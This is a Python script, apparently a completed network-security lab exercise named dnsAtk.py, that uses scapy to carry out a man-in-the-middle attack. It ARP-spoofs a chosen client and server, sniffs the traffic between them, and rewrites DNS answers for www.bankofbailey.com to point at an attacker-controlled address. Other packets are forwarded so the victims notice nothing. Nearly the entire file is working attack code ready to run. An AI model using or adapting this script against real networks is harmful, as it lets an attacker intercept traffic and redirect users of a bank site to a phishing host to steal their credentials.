# largely copied from https://0x00sec.org/t/quick-n-dirty-arp-spoofing-in-python/487
from scapy.all import *

import argparse
import os
import re
import sys
import threading
import time

# python3 dnsAtk.py -i eth0 --clientIP 10.4.22.145 --serverIP 10.4.22.231 -v 0

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--serverIP", help="IP of the server", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=1, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# returns the mac address for an IP
def mac(IP):
    result = sr1( ARP(op = 1, pdst = IP),verbose=False )
    return result.hwsrc


def spoof_thread(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC, interval = 3):
    while True:
        spoof(serverIP, attackerMAC, clientIP, clientMAC) # TODO: Spoof client ARP table
        spoof(clientIP,attackerMAC, serverIP, serverMAC) # TODO: Spoof server ARP table
        time.sleep(interval)


# TODO: spoof ARP so that dst changes its ARP table entry for src 
def spoof(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"spoofing {dstIP}'s ARP table: setting {srcIP} to {srcMAC}")
    send( ARP( op=2, psrc=srcIP, hwsrc=srcMAC, pdst=dstIP, hwdst=dstMAC ) )


# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    send( ARP( op=2, psrc=srcIP, hwsrc=srcMAC, pdst=dstIP, hwdst=dstMAC ) )


# TODO: handle intercepted packets
# NOTE: this intercepts all packets that are sent AND received by the attacker, so 
# you will want to filter out packets that you do not intend to intercept and forward
# ref: https://www.thepythoncode.com/article/make-dns-spoof-python
def interceptor(packet):
    global clientMAC, clientIP, serverMAC, serverIP, attackerMAC
    if packet.src == attackerMAC:
        return
    if packet.haslayer(IP) == False:
        sendp(packet)
        return

    #change the A record of any DNS query response for www.bankofbailey.com to resolve www.bankofbailey.com to 10.4.63.200
    
    
    if packet[IP].src == serverIP and packet[IP].dst == clientIP and packet[IP].haslayer(DNS):
        packet[DNS] = packet[DNS]
        if packet[DNS].an is not None:
            domain_name = packet[DNSQR].qname
            debug("domain_name: " + domain_name.decode('utf-8'))
            if  'www.bankofbailey.com' in domain_name.decode('utf-8') :
                debug(packet[DNS].an.rrname)
                debug(packet[DNS].an.rdata)

                packet[DNS].an = DNSRR(rrname=domain_name, rdata='10.4.63.200')
                packet[DNS].ancount = 1
                del packet[IP].len
                del packet[IP].chksum
                del packet[UDP].len
                del packet[UDP].chksum
                packet.show2(dump=True)
                    
        debug(packet[DNS].summary())
    

    # retransfer all packet not from attacker
    packet.src = attackerMAC
    packet.dst = serverMAC if packet[IP].dst == serverIP  else packet.dst
    packet.dst = clientMAC if packet[IP].dst == clientIP  else packet.dst
    sendp(packet)



if __name__ == "__main__":
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    clientIP = args.clientIP
    serverIP = args.serverIP
    attackerIP = get_if_addr(args.interface)

    clientMAC = mac(clientIP)
    serverMAC = mac(serverIP)
    attackerMAC = get_if_hwaddr(args.interface)

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, serverIP, serverMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, serverIP, serverMAC)
        restore(serverIP, serverMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, serverIP, serverMAC)
    restore(serverIP, serverMAC, clientIP, clientMAC)
